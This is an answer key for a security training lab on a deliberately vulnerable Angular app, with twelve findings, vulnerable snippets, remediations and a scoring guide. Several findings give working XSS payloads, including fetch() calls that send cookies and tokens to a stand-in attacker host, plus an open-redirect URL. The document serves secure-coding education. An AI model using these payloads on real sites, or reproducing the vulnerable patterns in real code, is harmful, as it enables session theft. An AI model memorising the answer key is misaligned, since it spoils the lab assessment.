# Lab 1: Answer Key - Angular Vulnerability Identification

## Summary

| # | Vulnerability | Location | OWASP | Severity |
|---|--------------|----------|-------|----------|
| 1 | XSS via bypassSecurityTrustHtml | xss-bypass.component.ts:122-127 | A03 | Critical |
| 2 | XSS via innerHTML (stored) | xss-innerhtml.component.ts:141-153 | A03 | Critical |
| 3 | XSS via innerHTML (reflected) | xss-innerhtml.component.ts:183-189 | A03 | High |
| 4 | XSS via URL sanitizer bypass | xss-interpolation.component.ts | A03 | High |
| 5 | XSS via DOM manipulation | xss-interpolation.component.ts | A03 | High |
| 6 | JWT stored in localStorage | auth.service.ts:58-59 | A02 | High |
| 7 | Credential logging | auth.service.ts:53 | A02 | Medium |
| 8 | Client-side role checking | auth.service.ts:107-112 | A07 | Medium |
| 9 | Missing CSRF protection | csrf-demo.component.ts | A01 | High |
| 10 | Open redirect | redirect-handler.component.ts:191-206 | A01 | Medium |
| 11 | Sensitive data in environment | environment.ts | A02 | High |
| 12 | Sensitive data logging | data-exposure.component.ts | A02 | Medium |

---

## Detailed Findings

### 1. XSS via bypassSecurityTrustHtml

**Location:** `src/app/vulnerable/components/xss-bypass/xss-bypass.component.ts`

**Vulnerable Code:**
```typescript
processHtml(): void {
  // VULN: Bypasses Angular sanitization for user input!
  this.processedContent = this.sanitizer.bypassSecurityTrustHtml(this.userHtml);
}
```

**Template:**
```html
<div [innerHTML]="processedContent"></div>
```

**Impact:** Attackers can execute arbitrary JavaScript, steal cookies/tokens, perform actions as the user.

**Attack Payloads:**
```html
<script>alert('XSS')</script>
<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
<svg onload="alert(document.domain)">
```

**Remediation:**
- Never use `bypassSecurityTrustHtml()` with user input
- Implement custom sanitizer with tag/attribute allowlist
- Use text content instead of HTML when possible

---

### 2. Stored XSS via innerHTML

**Location:** `src/app/vulnerable/components/xss-innerhtml/xss-innerhtml.component.ts`

**Vulnerable Code:**
```typescript
// Template
<div class="comment-body" [innerHTML]="comment.body"></div>

// Component - stores unsanitized input
this.comments.push({
  author: 'You',
  body: this.newComment,  // No sanitization
  date: new Date().toLocaleDateString()
});
```

**Impact:** Malicious comments execute for all users who view them.

**Attack:** Post comment containing `<img src=x onerror="alert(document.cookie)">`

---

### 3. Reflected XSS via URL Parameter

**Location:** `src/app/vulnerable/components/xss-innerhtml/xss-innerhtml.component.ts:183-189`

**Vulnerable Code:**
```typescript
ngOnInit(): void {
  this.route.queryParams.subscribe(params => {
    if (params['q']) {
      this.searchQuery = params['q'];
    }
  });
}

// Template
<span [innerHTML]="searchQuery"></span>
```

**Attack URL:** `http://localhost:4200/vulnerable/xss-innerhtml?q=<img src=x onerror=alert(1)>`

---

### 4. XSS via URL Sanitizer Bypass

**Location:** `src/app/vulnerable/components/xss-interpolation/xss-interpolation.component.ts`

**Vulnerable Code:**
```typescript
this.trustedShareUrl = this.sanitizer.bypassSecurityTrustUrl(this.shareUrl);
```

**Attack:** `javascript:alert(document.cookie)` as URL

---

### 5. XSS via DOM Manipulation

**Location:** `src/app/vulnerable/components/xss-interpolation/xss-interpolation.component.ts`

**Vulnerable Code:**
```typescript
generateWelcome(): void {
  const html = `<h3>Welcome, ${this.username}!</h3>`;
  this.welcomeContainer.nativeElement.innerHTML = html;
}
```

**Impact:** Direct innerHTML assignment bypasses Angular sanitization entirely.

---

### 6. JWT Stored in localStorage

**Location:** `src/app/vulnerable/services/auth.service.ts:58-59`

**Vulnerable Code:**
```typescript
localStorage.setItem(this.TOKEN_KEY, fakeToken);
```

**Impact:** Any XSS vulnerability can steal the token via:
```javascript
fetch('https://attacker.com/steal?token=' + localStorage.getItem('auth_token'))
```

**Remediation:** Use HttpOnly cookies for session tokens.

---

### 7. Credential Logging

**Location:** `src/app/vulnerable/services/auth.service.ts:53`

**Vulnerable Code:**
```typescript
console.log('Login attempt:', { email, password });
```

**Impact:** Credentials visible in browser console, potentially captured by monitoring tools.

---

### 8. Client-Side Role Checking

**Location:** `src/app/vulnerable/services/auth.service.ts:107-112`

**Vulnerable Code:**
```typescript
isAdmin(): boolean {
  const decoded = this.decodeToken();
  return decoded?.role === 'admin';
}
```

**Impact:** Attackers can modify decoded token or localStorage to change role.

---

### 9. Missing CSRF Protection

**Location:** `src/app/vulnerable/components/csrf-demo/csrf-demo.component.ts`

**Issues:**
- No `withXsrfConfiguration()` in app config
- GET used for state-changing operations
- No SameSite cookie configuration

**Attack:** Hidden form on attacker's site submits to victim's bank while logged in.

---

### 10. Open Redirect

**Location:** `src/app/vulnerable/components/redirect-handler/redirect-handler.component.ts:191-206`

**Vulnerable Code:**
```typescript
handleRedirect(): void {
  // No validation - redirects to ANY URL
  window.location.href = this.returnUrl;
}
```

**Attack URL:** `http://yoursite.com/vulnerable/redirect?returnUrl=https://evil.com/fake-login`

---

### 11. Sensitive Data in Environment

**Location:** `src/environments/environment.ts`

**Exposed Data:**
```typescript
apiKey: 'sk_live_51ABC123...'
secretKey: 'secret_key_...'
databaseUrl: 'mongodb://admin:password@...'
```

**Impact:** All values bundled into client JavaScript, accessible to anyone.

---

### 12. Sensitive Data Logging

**Location:** `src/app/vulnerable/components/data-exposure/data-exposure.component.ts`

**Vulnerable Code:**
```typescript
console.log('Credit Card:', this.creditCard);
console.log('SSN:', this.ssn);
```

**Impact:** PII visible in browser console.

---

## Statistics

| OWASP Category | Count |
|----------------|-------|
| A03: Injection (XSS) | 5 |
| A02: Cryptographic Failures | 4 |
| A01: Broken Access Control | 2 |
| A07: Auth Failures | 1 |
| **Total** | **12** |

---

## Top 5 Critical Issues

1. **XSS via bypassSecurityTrustHtml** - Direct code execution
2. **JWT in localStorage** - Token theft via any XSS
3. **Stored XSS in comments** - Persistent attack on all users
4. **API keys in environment.ts** - Exposed in client bundle
5. **Open redirect** - Enables phishing attacks

---

## Scoring Guide

| Vulnerabilities Found | Score |
|----------------------|-------|
| 10-12 | Excellent |
| 8-9 | Good |
| 6-7 | Satisfactory |
| 4-5 | Needs Improvement |
| 0-3 | Requires Review |
